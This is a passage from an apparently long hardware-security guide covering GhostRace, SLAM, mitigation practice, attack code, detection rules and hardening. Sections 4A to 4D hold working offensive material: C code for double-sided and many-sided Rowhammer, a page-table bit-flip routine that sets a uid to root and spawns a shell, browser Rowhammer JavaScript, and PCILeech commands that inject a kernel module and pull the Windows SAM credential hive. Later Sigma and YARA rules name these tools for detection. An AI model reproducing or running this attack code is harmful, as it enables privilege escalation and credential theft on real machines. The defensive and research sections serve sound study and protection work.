- **Speculative Double-Lock.** A lock acquisition is speculatively bypassed, and the code speculatively proceeds as if it holds the lock, accessing protected data concurrently with the actual lock holder.

**Exploitation.** GhostRace identified 1283 potential Speculative Concurrent Use-After-Free (SCUAF) instances in the Linux kernel by analyzing code paths past synchronization primitives. The attacker must trigger speculation past a specific synchronization point while ensuring that another thread is modifying the protected data during the speculative window.

The attack is conceptually novel because it creates race conditions that are impossible under sequential consistency — they only exist in the speculative execution model. Traditional race-condition detection tools (ThreadSanitizer, Helgrind) cannot find these bugs because the races are invisible to the architectural execution. A new class of analysis tools, incorporating the speculative execution model into the memory-ordering analysis, is needed to systematically find SCUAF vulnerabilities.

**Cross-hypervisor impact.** GhostRace applies to any software that uses conditional synchronization and runs speculatively — not just the Linux kernel. Hypervisors (KVM, Xen, VMware ESXi) use lock-based synchronization for VM management data structures. A speculative bypass of these locks by a guest VM's hypercall could create speculative access to other VMs' management structures, potentially leaking guest metadata or triggering speculative use-after-free in hypervisor data structures.

**Affected CPUs.** All CPUs with speculative execution: Intel, AMD, and ARM. The vulnerability is inherent to the speculative execution model combined with software synchronization primitives. Specific CVE assignments: CVE-2024-2193 is the umbrella CVE; kernel-specific instances may receive separate CVEs.

**Mitigation.** The most complete mitigation is inserting serialization instructions (`lfence`, `IBPB`) at every synchronization point, but this is prohibitively expensive. The Linux kernel's approach is selective hardening: critical synchronization paths that protect security-sensitive data (e.g., credential checks, capability checks) are augmented with speculation barriers. The kernel commit series introduces `speculation_barrier()` calls at identified SCUAF-vulnerable sites. Full mitigation across all 1283 identified sites remains an ongoing effort.

### 3.9 SLAM (Spectre Linear Address Masking)

**Mechanism.** SLAM targets hardware pointer-tagging features: Intel's Linear Address Masking (LAM) and AMD's Upper Address Ignore (UAI). These features allow software to use the upper bits of 64-bit pointers (bits 48-62 in 4-level paging, bits 57-62 in 5-level paging) for metadata storage (type tags, memory-safety tags, pointer authentication) without affecting address translation — the hardware masks out (ignores) the upper bits before performing the page-table walk.

SLAM demonstrates that these masking features interact poorly with speculative execution. When a speculative load uses a pointer with metadata in the upper bits, the CPU speculatively translates the full address (before masking) in some pipeline stages, creating transient memory accesses at addresses derived from the metadata bits. An attacker who controls the upper bits of a pointer (which is the entire point of LAM/UAI — software puts arbitrary data there) can cause speculative accesses to addresses that leak information via cache side channels.

The attack is particularly insidious because LAM/UAI are being deployed to enhance security (memory tagging, ARM MTE interop, pointer authentication). SLAM shows that enabling these security features creates a new Spectre attack surface.

**Exploitation prerequisites.** The attacker needs a Spectre gadget where a pointer with attacker-controlled upper bits is dereferenced. With LAM/UAI enabled, such pointers are legitimate and common (the upper bits carry metadata). Without LAM/UAI, pointer canonicality checks (the CPU faults on non-canonical addresses) limit the attacker's ability to control the upper bits.

**Affected CPUs.** Intel CPUs with LAM support (future CPUs; LAM is not yet widely deployed). AMD CPUs with UAI support (Zen 3 and later; UAI is deployable now). ARM CPUs with Top-Byte Ignore (TBI) — ARM's equivalent, which has been deployed since ARMv8.0 and is used by Android's HWASan and Apple's pointer authentication. SLAM's principles apply to TBI as well.

**Mitigation.** The interaction between pointer masking and speculation barriers must be carefully managed: any speculative load using a masked pointer must either mask the pointer before the speculative access (which may require pipeline changes) or insert a speculation barrier after the pointer load and before the dereference. Intel has proposed microarchitectural fixes for LAM that ensure the masking occurs before any speculative cache access. AMD's UAI mitigation status is tracked in kernel commit discussions.

**Implications for memory-safety technologies.** SLAM is significant beyond its immediate exploit because it threatens the security assumptions of hardware-assisted memory safety. Technologies like ARM MTE (Memory Tagging Extension), CHERI capabilities, and Intel LAM-based sanitizers (HWASan, TypeSan) all rely on metadata stored in pointer bits. If the metadata bits can be used as speculative memory-access indices (as SLAM demonstrates), then the memory-safety metadata itself becomes an attack vector. Future hardware memory-safety designs must account for the speculative execution model — the metadata must be masked before any speculative operation, not just before architectural commitment.

**PoC availability.** The VUSec group (Vrije Universiteit Amsterdam) published a SLAM PoC demonstrating Spectre-style data leakage through LAM-tagged pointers on systems where LAM is enabled in the kernel. The PoC requires the victim to dereference a pointer with attacker-influenced upper bits — a scenario that is common in languages with pointer tagging (Lua, Ruby, JavaScript JITs) and in memory-safety tooling.

---

## 4. The hardware-vulnerability response model

Hardware vulnerabilities follow a distinct response pattern different from software bugs:

**Disclosure.** Typically coordinated between researchers and the CPU vendor, with a long embargo (months to years) because mitigations require microcode development, BIOS updates, OS patches, and compiler changes across multiple vendors simultaneously. The Spectre/Meltdown disclosure (January 2018) involved a 6-month embargo with coordination across Intel, AMD, ARM, Microsoft, Apple, Google, Amazon, and major Linux distributions. More recent disclosures (Downfall, Inception, Zenbleed) have followed 90-180 day embargo periods.

**Mitigation layers.** Microcode updates (deployed via BIOS or OS early-boot loading via `intel-ucode`/`amd-ucode` packages), kernel patches (new MSR configuration, scheduling changes, buffer clearing), compiler updates (retpoline, speculation barriers), and application-level changes (constant-time algorithms, cache-partitioning awareness).

**Performance impact.** Unlike software patches, hardware mitigations often impose permanent performance costs: KPTI costs 5-30% on syscall-heavy workloads, Downfall's gather-serialization costs up to 50% on vectorized workloads, disabling SMT costs ~30% of throughput, and the cumulative MDS/TAA `VERW`-on-every-transition cost is 1-5% on mixed workloads. These costs are ongoing and compound as new vulnerabilities are discovered. Organizations must make explicit risk-vs-performance tradeoff decisions, documented in their vulnerability management policies.

**Detection and auditing.** Hardware vulnerabilities are not "exploited" in the traditional sense (there are no signature-based detections). The detection and audit approach is:

1. **Mitigation verification.** Ensure microcode and kernel are up to date. Linux exposes per-vulnerability mitigation status via `/sys/devices/system/cpu/vulnerabilities/` (one file per vulnerability class: `spectre_v1`, `spectre_v2`, `meltdown`, `mds`, `tsx_async_abort`, `l1tf`, `mmio_stale_data`, `retbleed`, `spec_store_bypass`, `srbds`, `gather_data_sampling`, `reg_file_data_sampling`, `spec_rstack_overflow`). Each file reports "Not affected," "Vulnerable," or the specific mitigation in effect.

2. **Configuration audit.** Check for prerequisite exposure: is SMT enabled (`/sys/devices/system/cpu/smt/active`)? Are SGX enclaves in use? Are RAPL counters (`/sys/class/powercap/`) accessible to unprivileged users? Is TSX enabled (`tsx` kernel parameter)? Is KSM enabled (`/sys/kernel/mm/ksm/run`) — relevant for cross-VM Rowhammer?

3. **Runtime anomaly detection.** Monitor hardware performance counters for patterns indicative of exploitation attempts: high-frequency `clflush` operations (Rowhammer, cache side channels), abnormal branch misprediction rates (Spectre training), excessive TSX abort rates (TAA, T-SGX evasion), high RAPL read rates (PLATYPUS). These are heuristic detections with non-trivial false-positive rates.

4. **Firmware/microcode versioning.** The `cpuid` instruction and `/proc/cpuinfo` (`microcode` field) report the installed microcode version. Cross-reference with the vendor's security advisory to verify that mitigations for known CVEs are active.

**Cumulative performance impact.** The compounding nature of hardware mitigations deserves explicit attention. A server that enables all recommended mitigations for Spectre v1/v2, Meltdown (KPTI), MDS (`VERW`), L1TF (L1D flush), Downfall (gather serialization), Retbleed (IBRS/IBPB), and disables SMT may experience a total throughput reduction of 30-60% compared to an unmitigated baseline, depending on the workload profile. Syscall-intensive workloads (database servers, web servers with many short requests) are hit hardest (KPTI alone costs 5-30%; IBPB on context switch adds another 5-15%). Vectorized compute workloads (ML inference, scientific simulation) suffer primarily from the Downfall gather-serialization (up to 50%). I/O-heavy workloads see the least impact (1-5%) because the bottleneck is the I/O subsystem, not the CPU pipeline.

Organizations must make explicit, documented decisions about which mitigations to enable based on their threat model. A single-tenant bare-metal server processing only trusted workloads may reasonably disable some mitigations (e.g., no need for L1D flush if no SGX enclaves are running). A multi-tenant cloud provider must enable all mitigations and absorb the performance cost.

**Cloud provider responses.** Major cloud providers have adopted different strategies for hardware-vulnerability mitigation:

- **AWS.** Applies all microcode mitigations immediately on disclosure. Disables SMT on instances that run untrusted tenant code (bare-metal instances are tenant-controlled). Uses custom Nitro hypervisor that minimizes the VMM attack surface. Disables KSM across all instance types. Offers "dedicated hosts" for customers who need explicit control over mitigation configuration.
- **GCP.** Applies all mitigations fleet-wide. Uses live-migration to evacuate VMs from unpatched hosts during microcode rollouts, enabling zero-downtime patching. Disables TSX and KSM globally. Provides transparency reports on mitigation status.
- **Azure.** Applies mitigations fleet-wide. Uses custom hypervisor derived from Hyper-V. Offers AMD SEV-SNP-based confidential VMs as a first-class offering, shifting the hardware-vulnerability risk from the hypervisor to the hardware isolation boundary.

All three providers have publicly stated that they absorb the performance overhead of mitigations (typically 10-30% depending on workload) rather than exposing per-vulnerability toggle switches to tenants, on the principle that shared-tenancy security is non-negotiable.

The hardware-vulnerability landscape continues to evolve as researchers discover new microarchitectural behaviors that leak information, and CPU vendors respond with mitigations that add overhead. The fundamental tension remains: aggressive performance optimizations (speculative execution, out-of-order execution, shared buffers, dynamic frequency scaling) create side channels that leak information across security boundaries. Each optimization that improves performance creates potential attack surface, and each mitigation that closes a side channel reduces performance. There is no general solution to this tension — only an ongoing process of discovery, disclosure, mitigation, and performance tuning that organizations must manage as a permanent operational concern.

**Microcode deployment logistics.** Microcode updates are delivered through two channels: (1) BIOS/UEFI firmware updates from the motherboard or system vendor, and (2) OS-level early-loading from the `intel-ucode` or `amd-ucode` packages, applied by the bootloader before the kernel starts. The OS-level mechanism is faster to deploy (no reboot into BIOS required, just a kernel package update and reboot) and is the primary deployment vector for security-critical microcode updates. The `/sys/devices/system/cpu/cpu0/microcode/version` sysfs entry confirms the loaded microcode version.

```bash
# Check current microcode version
cat /proc/cpuinfo | grep -m1 microcode
# Example output: microcode : 0xf4

# Check vulnerability mitigation status for all known hardware vulns
for f in /sys/devices/system/cpu/vulnerabilities/*; do
    echo "$(basename $f): $(cat $f)"
done
# Example output:
# gather_data_sampling: Mitigation: Microcode
# l1tf: Mitigation: PTE Inversion; VMX: flush not necessary
# mds: Mitigation: Clear CPU buffers; SMT Host state unknown
# meltdown: Not affected
# spec_store_bypass: Mitigation: Speculative Store Bypass disabled
# spectre_v1: Mitigation: usercopy/swapgs barriers
# spectre_v2: Mitigation: Enhanced / Automatic IBRS
# tsx_async_abort: Mitigation: TSX disabled
```

### 4A. Rowhammer exploitation code

#### 4A.1 Double-sided Rowhammer with huge pages

```c
/* double_sided_rowhammer.c — gcc -O2 -o hammer double_sided_rowhammer.c */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>

#define ROW_SIZE       8192
#define HUGE_PAGE_SIZE (2 * 1024 * 1024)
#define NUM_HUGE_PAGES 64
#define HAMMER_ITERS   2500000

static inline void clflush(volatile void *p) {
    asm volatile("clflush (%0)" :: "r"(p) : "memory");
}

void hammer_pair(volatile char *a, volatile char *b, int n) {
    for (int i = 0; i < n; i++) {
        *(volatile char *)a;
        *(volatile char *)b;
        clflush(a); clflush(b);
        asm volatile("mfence");
    }
}

int main(void) {
    size_t total = (size_t)NUM_HUGE_PAGES * HUGE_PAGE_SIZE;
    char *mem = mmap(NULL, total, PROT_READ|PROT_WRITE,
                     MAP_PRIVATE|MAP_ANONYMOUS|MAP_HUGETLB, -1, 0);
    if (mem == MAP_FAILED) { perror("mmap"); return 1; }
    memset(mem, 0x00, total);

    int flips = 0;
    for (size_t hp = 0; hp < total; hp += HUGE_PAGE_SIZE) {
        for (size_t off = 0;
             off < HUGE_PAGE_SIZE - 3*ROW_SIZE;
             off += ROW_SIZE) {
            volatile char *ag_a = mem + hp + off;
            volatile char *vic  = mem + hp + off + ROW_SIZE;
            volatile char *ag_b = mem + hp + off + 2*ROW_SIZE;
            hammer_pair(ag_a, ag_b, HAMMER_ITERS);
            for (size_t b = 0; b < ROW_SIZE; b++) {
                if (vic[b] != 0x00) {
                    printf("[!] FLIP 0x%lx: 0x%02x\n",
                           (unsigned long)(hp+off+ROW_SIZE+b),
                           (unsigned char)vic[b]);
                    flips++;
                }
            }
            memset((void *)vic, 0x00, ROW_SIZE);
        }
    }
    printf("[*] %d flips found\n", flips);
    munmap(mem, total);
}
```

At ~50 ns per tRC, 2.5M iterations produces ~125 ms of hammering (two full 64 ms refresh intervals). Huge pages provide physical contiguity without requiring `/proc/PID/pagemap`.

#### 4A.2 PTE bit-flip exploitation

```c
/* PTE layout (x86-64):
 *   Bit 0: Present  |  Bit 1: R/W  |  Bit 2: U/S
 *   Bit 7: PS (4K→2M)  |  Bits 12-51: PFN
 * A flip in PFN redirects the mapping to arbitrary phys memory. */

void exploit_pte_flip(void *user_vaddr) {
    uint64_t *kview = (uint64_t *)user_vaddr;
    for (int i = 0; i < 4096 / 8; i++) {
        if (kview[i] == 1000ULL) {        /* uid field heuristic */
            kview[i] = 0;                 /* uid → root */
            setuid(0);
            execl("/bin/sh", "sh", NULL);
        }
    }
}

/* Memory massaging: spray 50K-200K pages to force PTE pages
 * onto victim DRAM rows adjacent to attacker aggressors. */
void spray_page_tables(int n) {
    for (int i = 0; i < n; i++) {
        void *p = mmap(NULL, 4096, PROT_READ|PROT_WRITE,
                       MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
        *(volatile char *)p = 0;  /* force PTE allocation */
    }
}
```

#### 4A.3 TRR bypass: TRRespass many-sided pattern

```c
/* 19 aggressors exceeds all known TRR counter capacities (max: 16).
 * Each individual aggressor stays below TRR threshold;
 * cumulative disturbance exceeds the flip threshold. */
#define N_AGG 19
void trrespass(volatile char *agg[N_AGG], int iters) {
    for (int r = 0; r < iters / N_AGG; r++) {
        for (int a = 0; a < N_AGG; a++)
            *(volatile char *)agg[a];
        for (int a = 0; a < N_AGG; a++)
            asm volatile("clflush (%0)" :: "r"(agg[a]));
        asm volatile("mfence");
    }
}
```

Blacksmith further optimizes by varying per-aggressor frequency (non-uniform patterns), exploiting TRR's assumption of uniform hammering.

#### 4A.4 Rowhammer.js browser-based concept

```javascript
// Browser Rowhammer: no clflush available — use cache eviction
const buf = new ArrayBuffer(256 * 1024 * 1024); // trigger THP
const view = new Uint32Array(buf);

function evict(set) {
    for (let i = 0; i < set.length; i++) view[set[i]];
}
function hammer(addrA, addrB, evA, evB, n) {
    for (let i = 0; i < n; i++) {
        view[addrA]; view[addrB]; evict(evA); evict(evB);
    }
}
```

Browser mitigations (5 μs `performance.now()`, COOP/COEP for `SharedArrayBuffer`, THP restrictions) raise the bar but do not eliminate the technique. SMASH (2021) achieved flips from Firefox/Chrome on TRR-enabled DDR4 by synchronizing hammer bursts with DRAM refresh intervals.

#### 4A.5 Memory templating and automated scanning

```python
#!/usr/bin/env python3
"""rowhammer_scanner.py — scan DRAM for exploitable bit flips.
Outputs JSON flip map: row, byte offset, physical address, flipped bits.
Usage: sudo python3 rowhammer_scanner.py --rows 4096 --iters 1000000"""
import mmap, os, struct, json, argparse, time

ROW_SIZE = 8192

def virt_to_phys(va):
    fd = os.open("/proc/self/pagemap", os.O_RDONLY)
    os.lseek(fd, (va // 4096) * 8, os.SEEK_SET)
    e = struct.unpack("Q", os.read(fd, 8))[0]
    os.close(fd)
    if not (e & (1 << 63)): return -1
    return ((e & ((1 << 55) - 1)) * 4096) + (va % 4096)

def scan(rows, iters, fill):
    size = rows * ROW_SIZE
    buf = mmap.mmap(-1, size,
                    mmap.MAP_PRIVATE | mmap.MAP_ANONYMOUS | 0x40000,
                    mmap.PROT_READ | mmap.PROT_WRITE)
    buf[:] = bytes([fill]) * size
    flips = []
    for row in range(1, rows - 1):
        v_off = row * ROW_SIZE
        # Delegate hammering to compiled C binary for speed
        os.system(f"./hammer_pair {(row-1)*ROW_SIZE} "
                  f"{(row+1)*ROW_SIZE} {iters}")
        for b in range(ROW_SIZE):
            if buf[v_off + b] != fill:
                flips.append({"row": row, "byte": b,
                    "phys": hex(virt_to_phys(v_off + b)),
                    "got": hex(buf[v_off + b]),
                    "xor": bin(buf[v_off + b] ^ fill)})
        buf[v_off:v_off+ROW_SIZE] = bytes([fill]) * ROW_SIZE
    buf.close()
    return flips

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--rows", type=int, default=1024)
    ap.add_argument("--iters", type=int, default=1000000)
    ap.add_argument("--fill", type=int, default=0)
    ap.add_argument("--out", default="flipmap.json")
    a = ap.parse_args()
    f = scan(a.rows, a.iters, a.fill)
    json.dump({"date": time.strftime("%Y-%m-%d"), "flips": f},
              open(a.out, "w"), indent=2)
    print(f"[*] {len(f)} flips → {a.out}")
```

The flip map guides exploitation: identify rows where flips hit PTE-critical bit positions (bits 0–2 for P/RW/US, bits 12–51 for PFN), then massage memory layout to place target PTEs on those rows.

---

### 4B. SGX attack tools

#### 4B.1 SGX-Step: single-stepping enclaves

```bash
git clone https://github.com/jovanbulck/sgx-step && cd sgx-step
cd kernel && make && sudo insmod sgx-step-mod.ko && cd ..
cd libsgxstep && make && cd ../app && make
sudo ./attacker
# Workflow:
#   1. Load target enclave
#   2. Configure APIC timer (one-shot, calibrated to 1 instruction)
#   3. Each AEX → read GPRSGX.RIP from SSA → log instruction trace
#   4. Between AEXs: PRIME+PROBE / FLUSH+RELOAD for cache state
```

SGX-Step programs the local APIC timer in one-shot mode calibrated to fire after one enclave instruction. After each AEX, the attacker reads `GPRSGX.RIP` from the SSA, probes the cache, and re-arms. This achieves per-instruction cache observation — sufficient to extract AES keys from T-table implementations in <1000 encryptions.

#### 4B.2 Enclave dumping and enumeration

```bash
# Controlled page-fault tracing
cat /proc/$(pgrep enclave_app)/maps | grep sgx
# Mark pages non-present → each fault reveals accessed page + RIP

# SGX capability check
cpuid | grep -i sgx        # CPUID 0x12: SGX1/SGX2, EPC base/size
ls -la /dev/sgx_enclave /dev/sgx_provision 2>/dev/null
grep sgx /proc/*/maps 2>/dev/null   # running enclaves
systemctl status aesmd               # Architectural Enclave Service
```

#### 4B.3 Intel SGX SDK + Gramine research environment

```bash
# SGX SDK install (Ubuntu)
echo 'deb [arch=amd64] https://download.01.org/intel-sgx/sgx_repo/ubuntu jammy main' \
    | sudo tee /etc/apt/sources.list.d/intel-sgx.list
wget -qO- https://download.01.org/intel-sgx/sgx_repo/ubuntu/intel-sgx-deb.key \
    | sudo apt-key add -
sudo apt update && sudo apt install libsgx-epid libsgx-quote-ex \
    libsgx-dcap-ql sgx-aesm-service libsgx-urts

# Gramine: run unmodified apps in SGX for side-channel research
sudo apt install gramine
# Create manifest with debug=true (enables PTRACE — essential
# for research, eliminates SGX security guarantees)
gramine-sgx-sign --manifest app.manifest.template --output app.manifest.sgx
gramine-sgx ./app
```

#### 4B.4 AEX-Notify

Available on Sapphire Rapids+. Enclaves receive a notification on every AEX, enabling detection of SGX-Step single-stepping (>1000 AEX/sec vs. normal <100/sec). Enclaves can re-randomize layout on each AEX, defeating page-fault side channels. Does NOT defeat hyper-thread PRIME+PROBE (no AEX involved). Requires recompilation — existing binaries gain no protection.

---

### 4C. DMA attack tools and code

#### 4C.1 PCILeech

```bash
# Dump first 4 GB of physical memory via FPGA PCIe device
pcileech.exe dump -device fpga -min 0 -max 0x100000000 -out memdump.raw

# Kernel module injection (Windows 10 x64)
pcileech.exe kmd -kmd WIN10_X64_3 -device fpga
# Post-injection: pull SAM hive
pcileech.exe wx64_filepull -kmd 0x7fffe000 \
    -s "C:\Windows\System32\config\SAM" -out SAM.hive
```

#### 4C.2 Inception + FPGA platforms

```bash
# Inception: DMA-based auth bypass via FireWire/Thunderbolt
inception --device firewire      # or --device thunderbolt
# Patches msv1_0.dll (Win), loginwindow (macOS), pam_unix.so (Linux)
```

**FPGA platforms:** Screamer/LambdaConcept (~$200, customizable PCI Device/Vendor ID to evade IOMMU device-type policies), PCIe Squirrel (Artix-7, ~2 GB/s DMA), Screamer M.2 (laptop internal slot).

#### 4C.3 DMA protection verification

```bash
# IOMMU status
dmesg | grep -i iommu   # "DMAR: IOMMU enabled" or "AMD-Vi:"
grep -oP '(intel_iommu|iommu)=[^ ]+' /proc/cmdline
# CRITICAL: iommu=pt means passthrough — DMA NOT isolated

# Thunderbolt security level
cat /sys/bus/thunderbolt/devices/*/security
# none=vulnerable, user=auth required, secure=auth+key, dponly=safest

# IOMMU group isolation (multi-device groups = potential bypass)
for g in /sys/kernel/iommu_groups/*/; do
    n=$(ls "$g/devices/" 2>/dev/null | wc -l)
    [ "$n" -gt 1 ] && echo "Group $(basename $g): $n devices"
done
```

#### 4C.4 bolt/thunderbolt-tools

```bash
sudo apt install bolt
boltctl list                          # connected devices
boltctl info <uuid>                   # authorization status
sudo boltctl policy default deny      # block unknown devices
```

---

### 4D. TPM attack tools

#### 4D.1 TPM-FAIL timing attack

TPM-FAIL (CVE-2019-11090/CVE-2019-16863): non-constant-time ECDSA scalar multiplication in Intel fTPM and STMicro discrete TPMs leaks nonce bits via wall-clock timing. ~45,000 `TPM2_Sign` operations + lattice solver (HNP via fpLLL) recovers 256-bit ECDSA private key.

#### 4D.2 faulTPM voltage glitch

faulTPM (2023): voltage glitch injector on AMD SVI2 bus undervolts PSP during `TPM2_Unseal` RSA/AES. DFA on faulty outputs recovers the storage root key → full BitLocker bypass. Requires physical access + ~$200 ChipWhisperer or custom SVI2 injector.

#### 4D.3 tpm2-tools

```bash
tpm2_getcap properties-fixed          # manufacturer, FW version
tpm2_pcrread sha256                   # all PCR values
tpm2_getcap handles-persistent        # stored keys

# Create test key for timing analysis
tpm2_createprimary -C e -g sha256 -G ecc256:ecdsa -c primary.ctx
tpm2_create -C primary.ctx -g sha256 -G ecc256:ecdsa -u k.pub -r k.priv
tpm2_load -C primary.ctx -u k.pub -r k.priv -c sign.ctx
for i in $(seq 1 10000); do
    tpm2_sign -c sign.ctx -g sha256 -o /dev/null /dev/urandom 2>/dev/null
done
```

#### 4D.4 Pluton vs. discrete TPM vs. fTPM

| Property | Discrete TPM | fTPM (PSP/ME) | Microsoft Pluton |
|----------|-------------|---------------|-----------------|
| Bus sniffing | Vulnerable (SPI/I2C) | N/A | N/A |
| Voltage glitch | Separate rail | faulTPM (shared rail) | Isolated domain |
| Updates | Vendor-manual | CPU microcode | Windows Update |

#### 4D.5 sniff-tpm and PolicyPCR bypass

Discrete TPMs transmit secrets (BitLocker VMK) in cleartext over SPI/I2C after `TPM2_Unseal`. Interception via logic analyzer or FPGA interposer captures the VMK. **Mitigation:** TPM + PIN (prevents unattended unseal) or fTPM/Pluton.

Policy bypass scenarios: (1) PCR manipulation — boot modified OS that extends PCRs to expected values (requires disabled Secure Boot); (2) TPM reset via LPC pin clears PCRs without host reboot; (3) weak PolicySecret authorization brute-forced.

---

### 4E. Detection engineering

#### 4E.1 Sigma rules

```yaml
title: Potential Rowhammer - High Page Fault Rate
id: 8a3f7c2e-1d4b-4e5a-9c8f-2b6d3a7e4f1c
status: experimental
logsource: { category: process_creation, product: linux }
detection:
    selection: { EventType: 'perf_counter', CounterName: 'page-faults' }
    filter: { CounterValue|gte: 100000 }
    condition: selection and not filter
    timeframe: 60s
level: high
tags: [ attack.privilege_escalation, attack.t1068 ]
falsepositives: [ Scientific workloads, DB buffer warmup ]

---
title: Suspicious Huge Page Allocation
id: 5e2c8b1a-3f6d-4a7e-b9c2-1d8e4f3a5b6c
status: experimental
logsource: { category: process_creation, product: linux }
detection:
    selection: { Syscall: 'mmap', Flags|contains: 'MAP_HUGETLB' }
    filter: { Length|gte: 67108864 }
    condition: selection and filter
level: medium
tags: [ attack.privilege_escalation, attack.t1068 ]
falsepositives: [ DPDK, JVM -XX:+UseLargePages, PostgreSQL ]

---
title: Thunderbolt/DMA Device Hotplug
id: 9f4a6d3e-2c7b-5e8a-a1d4-3b9c2e5f7a8d
status: experimental
logsource: { category: driver_load, product: linux }
detection:
    selection: { EventType|contains: [ 'thunderbolt', 'pcieport' ], Action: 'add' }
    condition: selection
level: medium
tags: [ attack.credential_access, attack.t1040 ]
```

#### 4E.2 YARA rules

```yara
rule Rowhammer_Exploit_Binary {
    meta:
        description = "Detects compiled Rowhammer exploit tools"
        date = "2025-01-15"
        severity = "high"
    strings:
        $clflush = { 0F AE 38 }   $clflush2 = { 0F AE 3F }
        $mfence  = { 0F AE F0 }   $rdtscp   = { 0F 01 F9 }
        $s1 = "rowhammer" ascii nocase
        $s2 = "/proc/self/pagemap" ascii
        $s3 = "MAP_HUGETLB" ascii
    condition:
        uint16(0) == 0x457F and
        ((all of ($clflush*, $mfence, $rdtscp)) or
         (2 of ($s*) and $mfence))
}

rule DMA_Attack_Tool {
    meta:
        description = "Detects DMA attack tool signatures"
        date = "2025-01-15"
        severity = "high"
    strings:
        $a = "pcileech" ascii nocase  $b = "inception" ascii nocase
        $c = "memdump.raw" ascii      $d = "WIN10_X64" ascii
        $e = "-device fpga" ascii     $f = "--device firewire" ascii
    condition:
        2 of ($a, $b, $c, $d, $e, $f)
}
```

#### 4E.3 Hardware monitoring

```bash
# mcelog: machine check exceptions (ECC-corrected Rowhammer flips)
sudo mcelog --daemon && sudo mcelog --client

# EDAC sysfs: per-DIMM error counts
cat /sys/devices/system/edac/mc/mc0/ce_count   # correctable
cat /sys/devices/system/edac/mc/mc0/ue_count   # uncorrectable
# Baseline: <1 CE/day normal; >100 CE/hour suspicious

# rasdaemon
sudo apt install rasdaemon && sudo systemctl enable --now rasdaemon
ras-mc-ctl --summary
```

#### 4E.4 IOMMU verification script

```bash
#!/bin/bash
echo "=== IOMMU Audit ==="
grep -oP '(intel_iommu|iommu|amd_iommu)=[^ ]+' /proc/cmdline
dmesg | grep -qi "DMAR: IOMMU enabled" && echo "VT-d: ON" \
    || dmesg | grep -qi "AMD-Vi" && echo "AMD-Vi: ON" \
    || echo "WARNING: no IOMMU"
grep -q "iommu=pt" /proc/cmdline && echo "CRITICAL: passthrough mode"
for dev in /sys/bus/thunderbolt/devices/*/security; do
    echo "TB $(basename $(dirname $dev)): $(cat $dev)"
done 2>/dev/null
```

#### 4E.5 SGX attestation monitoring

Log all DCAP attestation requests. Alert on: TCB level below minimum (stale microcode), MRENCLAVE not in allowlist, high request rate (enumeration), unexpected source IPs.

#### 4E.6 perf counters for Rowhammer detection

```bash
# Rowhammer signature: sustained >1M LLC misses/sec + low IPC
sudo perf stat -e cache-misses,cache-references,instructions \
    -p $(pgrep suspect) -- sleep 10
# Heuristic: cache-misses/instructions > 0.5 (normal: <0.01)
```

---

### 4F. Hardware hardening

#### 4F.1 BIOS/UEFI settings

| Setting | Purpose |
|---------|---------|
| Intel VT-d / AMD-Vi | IOMMU — DMA isolation |
| Thunderbolt Security Level | DMA protection for TB ports |
| Intel Boot Guard | Hardware-rooted boot integrity |
| TPM Enable | Platform integrity measurement |
| Overclocking Lock | Prevents Plundervolt (locks MSR 0x150) |
| Disable TB DMA on Lock | Block DMA when screen locked |
| Secure Boot | UEFI signature verification |

#### 4F.2 Linux kernel hardening

```bash
# /etc/default/grub — GRUB_CMDLINE_LINUX:
intel_iommu=on iommu=strict   # or amd_iommu=on iommu=strict
transparent_hugepage=never     # prevent Rowhammer THP abuse
tsx=off                        # prevent TAA
mitigations=auto               # all speculative-execution mitigations

# sysctl
vm.unprivileged_userfaultfd=0          # block TOCTOU
kernel.perf_event_paranoid=3           # block PLATYPUS
echo 0 > /sys/kernel/mm/ksm/run       # block cross-VM Rowhammer
```

#### 4F.3 Rowhammer defense stack

1. **DRAM:** ECC (SECDED/chipkill), TRR enabled, DDR5 RFM, halved tREFI
2. **Controller:** PARA, row-activation throttling
3. **Kernel:** disable KSM, disable THP, restrict pagemap (default ≥4.0), KPTI
4. **Application:** monitor EDAC counters, guard pages around critical allocs

#### 4F.4 DMA protection

```bash
# bolt daemon: deny unauthorized Thunderbolt devices
sudo apt install bolt && sudo boltctl policy default deny

# udev rule
echo 'ACTION=="add", SUBSYSTEM=="thunderbolt", ATTR{authorized}=="0", \
RUN+="/usr/bin/logger -t thunderbolt blocked:%k"' \
    | sudo tee /etc/udev/rules.d/99-tb-dma.rules
sudo udevadm control --reload-rules
```

#### 4F.5 Defense matrix

| Attack Class | Hardware Defense | Software Defense | Verification |
|-------------|-----------------|------------------|-------------|
| Rowhammer | ECC, TRR, RFM | Disable KSM/THP, KPTI | `cat /sys/devices/system/edac/mc/mc0/ce_count` |
| DMA | IOMMU (VT-d/AMD-Vi) | `intel_iommu=on iommu=strict`, bolt | `dmesg \| grep IOMMU` |
| SGX side channels | AEX-Notify, L1D flush, VERW | Constant-time, ORAM, nosmt | `cat /.../vulnerabilities/l1tf` |
| Plundervolt | MSR lock (OC Lock) | Lock MSR 0x150 | `rdmsr 0x150` |
| PLATYPUS | RAPL filtering (μcode) | `perf_event_paranoid=3` | `cat /proc/sys/kernel/perf_event_paranoid` |
| TPM sniffing | fTPM/Pluton | BitLocker + PIN | `tpm2_getcap properties-fixed` |
| Speculative exec | μcode, IBRS, STIBP | Retpoline, KPTI, VERW | `cat /.../vulnerabilities/*` |
| Downfall/GDS | μcode gather serial. | `-mno-gather` | `cat /.../vulnerabilities/gather_data_sampling` |

---

### 4G. CVE reference table (expanded)

| CVE | Attack | CVSS | Disclosed | Vendor | Mitigation |
|-----|--------|------|-----------|--------|------------|
| CVE-2015-0565 | Rowhammer | 7.8 | 2015-03 | DRAM (all) | ECC, TRR, PARA |
| CVE-2016-6728 | Drammer | 7.8 | 2016-10 | ARM/Android | ION hardening, ECC |
| CVE-2018-3615 | Foreshadow (SGX) | 6.5 | 2018-08 | Intel | L1D flush, μcode |
| CVE-2018-3620 | Foreshadow-OS | 5.6 | 2018-08 | Intel | L1D flush, PTE inversion |
| CVE-2018-3646 | Foreshadow-VMM | 5.6 | 2018-08 | Intel | L1D flush on VMENTER, nosmt |
| CVE-2018-12126 | Fallout (MSBDS) | 5.6 | 2019-05 | Intel | VERW, nosmt |
| CVE-2018-12127 | RIDL (MLPDS) | 5.6 | 2019-05 | Intel | VERW |
| CVE-2019-11091 | ZombieLoad (MFBDS) | 3.8 | 2019-05 | Intel | VERW |
